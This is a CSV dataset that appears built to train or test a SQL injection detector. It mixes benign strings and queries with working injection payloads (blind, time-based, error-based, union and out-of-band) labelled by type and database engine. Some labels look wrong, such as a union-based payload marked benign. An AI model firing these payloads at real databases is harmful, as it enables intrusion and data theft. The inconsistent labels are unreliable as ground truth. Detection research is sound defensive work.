payload_norm,payload_delex,sqli_type,db_engine,confidence,is_attack
"select * from users WHERE username = ""1 ) ) as atiy where 3855 = 3855 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --"" or username = ""1\' ) ) )",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __INT__ ) ) ),boolean_blind,oracle,0.8,True
1'+ ( select 'yhcf' where 8367 = 8367,__INT__ __STR__ __IDENT__ where __INT__ = __INT__,boolean_blind,generic,0.5,True
"select * from users WHERE username = ""1 and username = ""-6190\' ) where 2621 = 2621 or username = ""1\' ) ) as eltx where 9955 = 9955",select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ __STR__ ) ) as __IDENT__ where __INT__ = __INT__,error_based,oracle,0.85,True
decour raichs,__IDENT__ __IDENT__,benign,generic,0.9,False
"1"" where 9521 = 9521 or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) --",__INT__ where __INT__ = __INT__ or ( select * from ( select ( sleep ( __INT__ ) ) ) __IDENT__ ) - -,time_blind,generic,0.7,True
"select * from users WHERE username = ""1\' ) and ( \'ulkq\' = \'ulkq"" and username = ""1\' ) where 1502 = 1502 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( \'winx\' = \'winx""",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__,error_based,oracle,0.95,True
6.1643E+15,__IDENT__ + __INT__,benign,generic,0.9,False
"1"" ) ) procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #","__INT__ ) ) __IDENT__ __IDENT__ ( __IDENT__ ( __INT__ , concat ( __HEX__ , ( benchmark ( __INT__ , md5 ( __HEX__ ) ) ) ) ) , __INT__ ) #",time_blind,mysql,0.9,True
acr7m6nia,__IDENT__,benign,generic,0.9,False
du-tuan,__IDENT__ - __IDENT__,benign,generic,0.9,False
9ot87ico,__IDENT__,benign,generic,0.9,False
SELECT COUNT ( than ) FROM bring,select count ( __IDENT__ ) from __IDENT__,benign,generic,1.0,False
"1'+ ( select tvpj where 7058 = 7058 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) ) +'",__INT__ __STR__ __IDENT__ __STR__,time_blind,sqlite,0.7,True
nada,__IDENT__,benign,generic,0.9,False
"select * from users WHERE username = ""1 or 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) -- xwoo"" and username = ""1"" and username = ""-1344 ) as gqgi where 2545 = 2545","select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__ and __IDENT__ = "" - __INT__ ) as __IDENT__ where __INT__ = __INT__",error_based,oracle,0.9,True
6ar10l30,__IDENT__,benign,generic,0.9,False
"1"" ) as jidc where 6093 = 6093 and 9198 = 9198--",__INT__ ) as __IDENT__ where __INT__ = __INT__ and __INT__ = __INT__ - -,boolean_blind,generic,0.5,True
"-3604' ) as fyev where 7259 = 7259 union all select 7259,7259,7259,7259--","- __INT__ ) as __IDENT__ where __INT__ = __INT__ union all select __INT__ , __INT__ , __INT__ , __INT__ - -",union_based,generic,0.7,True
"select * from users WHERE username = ""-8828%\' ) ) ) or username = ""-1985 ) ) ) and ( ( ( 1248 = 1248"" and ( ( ( \'%\' = \'""",select * from __IDENT__ where __IDENT__ = __STR__,error_based,oracle,0.8,True
"select * from users WHERE username = ""-2756\' where 6156 = 6156 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" and username = ""-2348 ) as sige where 1639 = 1639 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --""",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__,error_based,oracle,0.95,True
"SELECT Orders.collectrID, Employees.current, Employees.kind FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID = Employees.settingID ORDER BY Orders.fourID","select __IDENT__ , __IDENT__ , __IDENT__ from __IDENT__ join __IDENT__ on __IDENT__ = __IDENT__ order by __IDENT__",benign,generic,1.0,False
SELECT cutting ( s ) FROM other,select __IDENT__ ( __IDENT__ ) from __IDENT__,benign,generic,1.0,False
"-5726%"" ) ) or 6872 = 6872 and ( ( ""%"" = """,- __INT__ % __STR__ % __STR__,boolean_blind,generic,0.8,True
"-6789'|| ( select 'uckz' from dual where 2163 = 2163 union all select 2163,2163,2163,2163,2163,2163--","- __INT__ __STR__ __IDENT__ from dual where __INT__ = __INT__ union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ - -",benign,generic,1.0,False
"SELECT ID, post_title, post_name FROM wp_posts WHERE post_type = 'wpcf7_contact_form'","select __IDENT__ , __IDENT__ , __IDENT__ from __IDENT__ where __IDENT__ = __STR__",benign,mysql,0.9,False
"select * from users WHERE username = ""-7323%"" or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ""%"" = """" and username = ""1\' ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) """,select * from __IDENT__ where __IDENT__ = __STR__ or __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ) and __STR__ = __STR__ and __IDENT__ = __STR__,error_based,oracle,0.95,True
"1%"" ) ) and ( 7817 = 4371 ) *4371 and ( ( ""%"" = """,__INT__ % __STR__ % __STR__,boolean_blind,generic,0.5,True
SELECT * FROM arrow WHERE interest = mouth,select * from __IDENT__ where __IDENT__ = __IDENT__,benign,generic,1.0,False
"SELECT eggID AS ID, national AS pay FROM carry","select __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ from __IDENT__",benign,generic,1.0,False
select ( case when ( 8233 = 1074 ) then 8233 else 1/ ( select 0 ) end ) --,select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ / ( select __INT__ ) end ) - -,benign,generic,1.0,False
gattas,__IDENT__,benign,generic,0.9,False
"select * from users WHERE username = ""1 ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) or username = ""1\' ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) "" and username = ""1\' ) ) and ( ( \'ajka\' = \'ajka""",select * from __IDENT__ where __IDENT__ = __STR__ __INT__ __STR__ ) ) and ( ( \ __STR__ = __IDENT__,error_based,oracle,0.95,True
"SELECT bare,directly,brave,younger,stay ( ( seed JOIN teacher ON ordinary.death = everyone.consist ) INNER JOIN cleanON Orders.old = stepped.fenceID )","select __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ( ( __IDENT__ join __IDENT__ on __IDENT__ = __IDENT__ ) inner join __IDENT__ __IDENT__ = __IDENT__ )",benign,generic,1.0,False
1 ) ) as muyz where 6105 = 6105,__INT__ ) ) as __IDENT__ where __INT__ = __INT__,boolean_blind,generic,0.8,True
"select * from users WHERE username = ""-7199\' and 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) or \'qibr\' = \'qibr"" and username = ""1 ) ) ) or 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) temp ( ( ( 6395 = 6395""",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__,error_based,oracle,0.95,True
"select * from users WHERE username = ""-1254"" and username = ""1\' ) ) ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( \'pneh\' like \'pneh""",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__,boolean_blind,oracle,0.8,True
"select * from users WHERE username = ""1 ) ) as dgso where 4654 = 4654 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" and username = ""-4582 ) ) as gvfo where 8885 = 8885 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --""",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__,error_based,oracle,0.9,True
"select * from users WHERE username = ""-8163 ) ) as cvai where 2360 = 2360 or username = ""1 ) ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) )","select * from __IDENT__ where __IDENT__ = __STR__ __INT__ ) ) ) and __INT__ = __IDENT__ ( __INT__ , ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) )",boolean_blind,oracle,0.8,True
"select * from users WHERE username = ""1%\' ) ) ) or username = ""-1254"" or username = ""-5313\' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( \'wkkp\' like \'wkkp""",select * from __IDENT__ where __IDENT__ = __STR__,error_based,postgresql,0.85,True
-4882' order by 1#,- __INT__ order by __INT__,boolean_blind,generic,0.5,True
"select * from users WHERE username = ""-7746\' ) ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and username = ""-7962\' ) ) as pgqz where 6058 = 6058 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --""",select * from __IDENT__ where __IDENT__ = __STR__,out_of_band,oracle,0.8,True
"select * from users WHERE username = ""-1985 ) ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( 1248 = 1248"" and username = ""1\'",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __INT__,error_based,oracle,0.95,True
"SELECT REPLACE ( ""XYZ FGH XYZ"", ""X"", ""M"" ) ;","select replace ( __STR__ , __STR__ , __STR__ ) ;",benign,mysql,0.9,False
"c/ arbitro eduardo vidal torres, 12, 4c","__IDENT__ / __IDENT__ __IDENT__ __IDENT__ __IDENT__ , __INT__ , __IDENT__",benign,generic,0.9,False
"1 ) ) ) and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --","__INT__ ) ) ) and __INT__ = ( select count ( * ) from __IDENT__ ( __INT__ , __INT__ ) ) - -",time_blind,postgresql,0.7,True
"select * from generate_series ( 4465,4465,case when ( 4465 = 6232 ) then 1 else 0 end ) limit 1--","select * from __IDENT__ ( __INT__ , __INT__ , case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) limit __INT__ - -",boolean_blind,postgresql,0.8,True
SELECT * FROM birthday WHERE all = 'party' LIMIT 3,select * from __IDENT__ where all = __STR__ limit __INT__,benign,generic,1.0,False
SELECT * FROM invented WHERE mouse IN ( SELECT fifth FROM fought ),select * from __IDENT__ where __IDENT__ in ( select __IDENT__ from __IDENT__ ),benign,generic,1.0,False
"select * from users WHERE username = ""1"" and username = ""1%"" and username = ""-2348 ) as sige where 1639 = 1639 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --""",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__ and __IDENT__ = __STR__,error_based,postgresql,0.9,True
"calle darsena san magin 198,","__IDENT__ __IDENT__ __IDENT__ __IDENT__ __INT__ ,",benign,generic,0.9,False
"-5529"" or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' )",- __INT__ or __INT__ = ( __STR__ | | ( select case __INT__ when __INT__ then __INT__ else __INT__ end from __IDENT__ ) | | __STR__ ),heavy_query,firebird,0.7,True
37576555y,__IDENT__,benign,generic,0.9,False
) or ( 'a' = 'a,) or ( __STR__ = __IDENT__,boolean_blind,generic,0.9,True
"select * from users WHERE username = ""1\' ) ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and username = ""1\' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( \'cbnc\' like \'cbnc""",select * from __IDENT__ where __IDENT__ = __STR__,boolean_blind,postgresql,0.9,True
"1' where 4358 = 4358 union all select null,null,null,null--","__INT__ where __INT__ = __INT__ union all select null , null , null , null - -",union_based,generic,0.7,True
SELECT find FROM small UNION SELECT lose FROM tears ORDER BY harder,select __IDENT__ from __IDENT__ union select __IDENT__ from __IDENT__ order by __IDENT__,benign,generic,1.0,False
carre mamani,__IDENT__ __IDENT__,benign,generic,0.9,False
"select * from users WHERE username = ""1\' ) and ( \'mptm\' = \'mptm"" and username = ""1 ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __INT__ ) ) and __INT__ = cast ( ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) ) __IDENT__ | | ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) as __IDENT__ ),boolean_blind,mssql,0.85,True
2.42593E+15,__IDENT__ + __INT__,benign,generic,0.9,False
"select * from users WHERE username = ""1\' ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) or username = ""1\'|| ( select \'mgel\' where 3591 = 3591",select * from __IDENT__ where __IDENT__ = __INT__ __STR__ | | ( select \ __STR__ where __INT__ = __INT__,error_based,oracle,0.9,True
"1' ) and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --","__INT__ ) and __INT__ = ( select count ( * ) from __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ ) - -",heavy_query,db2,0.85,True
1 ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ),__INT__ ) and __INT__ = ( __STR__ | | ( select case __INT__ when __INT__ then __INT__ else __INT__ end from __IDENT__ ) | | __STR__ ),boolean_blind,firebird,0.8,True
boca de hurgano,__IDENT__ __IDENT__ __IDENT__,benign,generic,0.9,False
SELECT asleep ( s FROM usual RIGHT JOIN,select __IDENT__ ( __IDENT__ from __IDENT__ right join,benign,generic,1.0,False
-3185' ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( 'rknd' like 'rknd,- __INT__ __STR__ __IDENT__ __STR__ __IDENT__,error_based,mssql,0.9,True
"select * from users WHERE username = ""-3978 and username = ""1"" and username = ""1""",select * from __IDENT__ where __IDENT__ = __STR__ __INT__ __STR__ __INT__,error_based,oracle,0.85,True
"1"" ) as rgod where 5766 = 5766 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --","__INT__ ) as __IDENT__ where __INT__ = __INT__ or __INT__ = __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) , __INT__ ) - -",time_blind,oracle,0.9,True
SELECT * FROM Orders WHERE OrderDate BETWEEN #07/01/1996# AND #07/31/1996#;,select * from __IDENT__ where __IDENT__ between __INT__ / __INT__ / __INT__ and __INT__ / __INT__ / __INT__ ;,benign,mysql,0.9,False
1%' ) union all select null#,__INT__ % ' ) union all select null,union_based,generic,0.7,True
SELECT * FROM alone WHERE NOT kitchen = 'or',select * from __IDENT__ where not __IDENT__ = __STR__,benign,generic,1.0,False
SELECT option_value FROM wp_options WHERE option_name = 'user_registration_queue_flush_rewrite_rules' LIMIT 1,select __IDENT__ from __IDENT__ where __IDENT__ = __STR__ limit __INT__,benign,mysql,0.9,False
mcduffie,__IDENT__,benign,generic,0.9,False
"-9197%"" ) ) ) union all select 1040,1040,1040,1040,1040,1040,1040,1040,1040#","- __INT__ % "" ) ) ) union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__",union_based,generic,0.7,True
"SELECT clear,carbon,bottle,ranch,research ( ( scared JOIN clearly ON vertical.mass = president.valley ) INNER JOIN brokenON Orders.copper = vertical.arrowID )","select __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ( ( __IDENT__ join __IDENT__ on __IDENT__ = __IDENT__ ) inner join __IDENT__ __IDENT__ = __IDENT__ )",benign,generic,1.0,False
-1344 ) as gqgi where 2545 = 2545 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --,- __INT__ ) as __IDENT__ where __INT__ = __INT__ or __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ) - -,out_of_band,oracle,0.9,True
00033926r,__IDENT__,benign,generic,0.9,False
"select * from users WHERE username = ""-9688%\' ) ) and ( ( \'%\' = \'"" or-- 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" and username = ""-2756\' where 6156 = 6156",select * from __IDENT__ where __IDENT__ = __STR__ or - - __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ) - - __STR__ - __INT__ where __INT__ = __INT__,error_based,oracle,0.9,True
"-4802 union all select 7381,7381,7381,7381,7381,7381,7381,7381,7381,7381--","- __INT__ union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ - -",union_based,generic,0.7,True
11539856c,__IDENT__,benign,generic,0.9,False
gaviota 13,__IDENT__ __INT__,benign,generic,0.9,False
"-9583%"" ) ) union all select 9349,9349,9349,9349,9349,9349,9349--","- __INT__ % "" ) ) union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ - -",union_based,generic,0.7,True
SELECT evening ( s ) FROM choice UNION ALL,select __IDENT__ ( __IDENT__ ) from __IDENT__ union all,benign,generic,1.0,False
"SELECT Orders.avoidrID, Employees.temperature, Employees.cover FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID = Employees.baseID ORDER BY Orders.orderID","select __IDENT__ , __IDENT__ , __IDENT__ from __IDENT__ join __IDENT__ on __IDENT__ = __IDENT__ order by __IDENT__",benign,mysql,0.9,False
